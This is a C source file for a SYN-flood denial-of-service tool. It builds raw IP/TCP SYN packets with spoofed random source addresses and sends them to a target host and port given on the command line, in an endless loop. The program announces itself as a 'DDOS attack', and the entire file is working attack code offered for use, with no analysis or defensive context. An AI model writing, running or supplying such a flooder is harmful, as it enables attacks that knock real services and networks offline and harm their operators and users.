#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <error.h>
#include<netdb.h>
#define IP_HEADER_LEN sizeof(struct ip)
#define TCP_HEADER_LEN sizeof(struct tcphdr)
#define IP_TCP_HEADER_LEN IP_HEADER_LEN+TCP_HEADER_LEN
#define LOCALPORT 8888
void err_exit(const char *err_msg) {
	perror(err_msg);
	exit(1);
}
struct ip *fill_ip_header(int ip_packet_len) {
	struct ip *ip_header;
	ip_header = (struct ip *) malloc(IP_HEADER_LEN);
	ip_header->ip_v = IPVERSION;
	ip_header->ip_hl = sizeof(struct ip) / 4;
	ip_header->ip_tos = 0;
	ip_header->ip_len = htons(ip_packet_len);
	ip_header->ip_id = 0;
	ip_header->ip_off = 0;
	ip_header->ip_ttl = MAXTTL;
	ip_header->ip_p = IPPROTO_TCP;
	ip_header->ip_sum = 0;
	return ip_header;
}
struct tcphdr *fill_tcp_header(int dst_port) {
	struct tcphdr *tcp_header;
	tcp_header = (struct tcphdr *) malloc(TCP_HEADER_LEN);
	tcp_header->source = htons(LOCALPORT);
	tcp_header->dest = htons(dst_port);
	tcp_header->doff = 5;
	tcp_header->syn = 1;
	tcp_header->seq = random();
	tcp_header->ack_seq = 0;
	tcp_header->check = 0;
	return tcp_header;
}
void ip_tcp_send(const char *dst_ip, int dst_port, int sockfd) {
	struct ip *ip_header;
	struct tcphdr *tcp_header;
	struct sockaddr_in dst_addr;
	struct hostent *host;
	socklen_t sock_addrlen = sizeof(struct sockaddr_in);
	int ip_packet_len = IP_TCP_HEADER_LEN;
	char buf[ip_packet_len];
	host=gethostbyname(dst_ip);
	bzero(&dst_addr, sock_addrlen);
	dst_addr.sin_family = PF_INET;
	dst_addr.sin_addr= *(struct in_addr *)(host->h_addr_list[0]); ;
	dst_addr.sin_port = htons(dst_port);
	ip_header = fill_ip_header(ip_packet_len);
	ip_header->ip_dst=dst_addr.sin_addr;
	tcp_header = fill_tcp_header(dst_port);
	memcpy(buf, ip_header, IP_HEADER_LEN);
	memcpy(buf + IP_HEADER_LEN, tcp_header, TCP_HEADER_LEN);
	printf("DDOS attack start..........\n");
	while (1) {
		ip_header->ip_src.s_addr = random();
		sendto(sockfd, buf, ip_packet_len, 0, (struct sockaddr *) &dst_addr,
				sock_addrlen);
	}
}
int main(int argc, const char *argv[]) {
	if(argc < 2)
	{
		printf("usage:%s hostname/ip dst_port [src_port]", argv[0]);
		exit(1);
	}
	int sockfd, on = 1;
	if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
		err_exit("socket()");
	else
		printf("socket create success!!!\n");
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
		err_exit("setsockopt()");
	else
		printf("set socket option success\n");
	printf("starting attack..............\n");
	setuid(getpid());
	ip_tcp_send(argv[1], atoi(argv[2]), sockfd);
	close(sockfd);
	return 0;
}